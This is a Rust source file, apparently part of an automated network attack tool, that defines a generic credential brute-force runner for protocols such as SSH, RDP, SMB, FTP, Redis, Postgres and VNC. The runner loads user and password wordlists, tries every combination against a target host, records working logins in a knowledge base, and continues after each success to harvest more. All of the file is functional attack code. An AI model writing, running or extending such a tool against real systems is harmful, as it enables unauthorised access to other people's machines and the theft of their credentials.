pub mod ftp;
pub mod http_basic;
pub mod mongo;
pub mod mqtt;
pub mod postgres;
pub mod rdp;
pub mod redis;
pub mod smb;
pub mod snmp;
pub mod sql;
pub mod ssh;
pub mod telnet;
pub mod vnc;

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::Semaphore;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

/// Trait implemented by each protocol connector.
/// Only the `try_connect` method differs between protocols.
pub trait Connector: Send + Sync {
    /// Attempt a single login. Returns `true` on success.
    fn try_connect(
        &self,
        ip: &str,
        port: u16,
        user: &str,
        password: &str,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = bool> + Send + '_>>;
}

/// Generic brute-force runner that works with any `Connector`.
///
/// Eliminates the ~80% code duplication across the 6 Python connector modules.
/// Loads user/password wordlists, iterates all combinations, stores found credentials.
pub struct BruteForceAction<C: Connector> {
    connector: C,
    action_name: &'static str,
    protocol: &'static str,
    target_port: u16,
    parent: Option<&'static str>,
    concurrency: usize,
}

impl<C: Connector> BruteForceAction<C> {
    pub fn new(
        connector: C,
        action_name: &'static str,
        protocol: &'static str,
        target_port: u16,
        parent: Option<&'static str>,
        concurrency: usize,
    ) -> Self {
        Self {
            connector,
            action_name,
            protocol,
            target_port,
            parent,
            concurrency,
        }
    }

    /// Run brute-force against a target, storing credentials on success.
    async fn run_bruteforce(&self, target: &Target, state: &Arc<AppState>) -> ActionOutcome {
        let users = match load_wordlist(&state.paths.users_file).await {
            Ok(u) => u,
            Err(e) => {
                tracing::error!(%e, "failed to load users wordlist");
                return ActionOutcome::Failed(e.to_string());
            }
        };
        let passwords = match load_wordlist(&state.paths.passwords_file).await {
            Ok(p) => p,
            Err(e) => {
                tracing::error!(%e, "failed to load passwords wordlist");
                return ActionOutcome::Failed(e.to_string());
            }
        };

        let total = users.len() * passwords.len();
        tracing::info!(
            action = self.action_name,
            ip = %target.ip,
            port = self.target_port,
            combinations = total,
            "starting brute force"
        );

        let semaphore = Arc::new(Semaphore::new(self.concurrency));
        let mut found = false;

        for user in &users {
            for password in &passwords {
                // Check shutdown
                if state.shutdown.is_cancelled() {
                    tracing::info!("brute force interrupted by shutdown");
                    return if found {
                        ActionOutcome::Success
                    } else {
                        ActionOutcome::Failed("interrupted".to_string())
                    };
                }

                let _permit = semaphore.acquire().await.expect("semaphore closed");
                let success = self
                    .connector
                    .try_connect(&target.ip, self.target_port, user, password)
                    .await;

                if success {
                    tracing::info!(
                        action = self.action_name,
                        ip = %target.ip,
                        user = %user,
                        "credentials found"
                    );

                    // Store in knowledge base
                    let _ = state
                        .kb
                        .store_credential(
                            target.host_id,
                            self.protocol,
                            user,
                            password,
                            self.target_port,
                        )
                        .await;

                    found = true;
                    // Don't stop — keep trying to find more credentials
                }
            }
        }

        if found {
            ActionOutcome::Success
        } else {
            ActionOutcome::Failed("no credentials found".to_string())
        }
    }
}

impl<C: Connector + 'static> Action for BruteForceAction<C> {
    fn name(&self) -> &'static str {
        self.action_name
    }

    fn port(&self) -> Option<u16> {
        Some(self.target_port)
    }

    fn parent(&self) -> Option<&'static str> {
        self.parent
    }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(self.run_bruteforce(target, state))
    }
}

/// Load a wordlist file (one entry per line).
async fn load_wordlist(path: &std::path::Path) -> std::io::Result<Vec<String>> {
    let content = tokio::fs::read_to_string(path).await?;
    Ok(content
        .lines()
        .filter(|l| !l.is_empty())
        .map(String::from)
        .collect())
}
